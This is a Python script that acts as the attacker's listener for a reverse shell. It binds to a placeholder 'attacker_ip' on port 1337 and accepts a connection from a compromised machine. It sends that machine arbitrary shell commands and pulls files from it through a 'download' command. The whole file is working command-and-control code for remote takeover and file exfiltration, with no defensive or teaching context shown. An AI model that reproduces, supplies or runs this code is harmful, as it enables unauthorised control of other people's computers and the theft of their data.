import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
	cmd = input("enter a command: ")
	
	if cmd == "quit":
		connection.send(b"quit")
		connection.close()
		break

	elif cmd[:2] == "cd":
		connection.send(bytes(cmd, "utf-8"))
		recv = recv_data()
		print(recv.decode("utf-8"))
		continue

	elif cmd[:8] == "download":
		connection.send(bytes(cmd, "utf-8"))

		file_output = recv_data()
		if file_output == b"No file found":
			print(file_output.decode("utf-8"))
			continue

		with open(f'{cmd[9:]}', 'wb') as write_data:
			write_data.write(file_output)
			write_data.close()
		continue 
		
	connection.send(bytes(cmd, "utf-8"))
	
	output = recv_data()
	print(output.decode("utf-8"))

print("Server has stopped")